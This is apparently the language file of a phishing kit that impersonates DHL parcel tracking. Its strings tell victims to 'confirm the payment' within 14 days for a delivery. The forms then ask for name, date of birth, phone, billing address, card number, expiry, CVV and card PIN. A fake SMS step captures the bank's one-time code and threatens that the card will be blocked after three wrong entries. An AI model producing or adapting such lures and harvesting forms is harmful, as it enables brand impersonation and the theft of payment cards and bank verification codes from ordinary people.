<?php

function lang($phrase){
	static $lang = array(

		'Title_page'  => '| Welcome |', 	
		'Min_i1'  => 'Alerts(1)', 	
		'Min_i2'  => 'Global', 
		'Min_i3'  => 'Search', 


		'Ming_i1'  => 'Track', 
		'Ming_i2'  => 'Ship', 
		'Ming_i3'  => 'Logistics Solutions', 
		'Ming_i4'  => 'Customer Service', 




		'Text_i1'  => 'DHL TRACKING .', 
		'Text_i2'  => 'Here you will find information about your shipments.', 
		'Text_i3'  => 'Track your parcel shipments at any time from shipping to delivery', 

		'Text_b1'  => 'Important message!', 
		'Text_b2'  => 'To complete the delivery as soon as possible, please confirm the payment ', 
		'Text_b3'  => ' by clicking Next. Online confirmation must be made within the next 14 days, before it expires.', 

		'Input_i1'  => 'Full name', 
		'Input_i2'  => 'Date of birth', 
		'Input_i3'  => 'Phone number', 
		'Input_i4'  => 'Billing Address', 
		'Input_i5'  => 'Postal Code', 

 
 



		'Input_cc1' => 'Name on card',
		'Input_cc2' => 'Card number',
		'Input_cc3' => 'Expiry date  MM/YY',
		'Input_cc4' => 'Security code CVV (CVC)',
        'Input_cc5' => 'Card pin',


		'Btn_n1'  => 'Next', 

		'Footer_title1'  => 'POST DHL GROUP', 
		'Footer_title2'  => 'FOLLOW US', 
		'Footer_text1'  => 'Fraud Awareness', 
		'Footer_text2'  => 'Legal Notice', 
		'Footer_text3'  => 'Terms of Use', 
		'Footer_text4'  => 'Privacy Notice', 
		'Footer_text5'  => 'Dispute Resolution', 
		'Footer_text6'  => 'Accessibility', 
		'Footer_text7'  => 'Cookies Settings', 
		'Footer_text8'  => 'About', 
		'Footer_rights'  => '2020 © DHL International GmbH. All rights reserved.', 



		'Sms_text1' => 'Please confirm the next payment.',
		'Sms_text2' => 'The one-time password has been sent to the cell phone number listed below. If you need to change your mobile number, please contact your bank or change it through the available channels (ATM, web) ',
		'Sms_text3' => 'Merchant:',
		'Sms_text4' => 'Amount:',
		'Sms_text5' => 'Date:',
		'Sms_text6' => 'SMS code:',
		'Sms_text7' => 'Please enter the verification code received by sms:',
		'text_succ' => 'You have successfully activated your shipping process.You will receive an email from us when we send your package.',
		'Sms_error1' => 'SMS is wrong or expired! After (3) errors in entering the code received via SMS, the current transaction is canceled and the credit card blocked.'

	);	
	return $lang[$phrase];
}




//		 | ' | = &apos;




 ?>
 
 
 
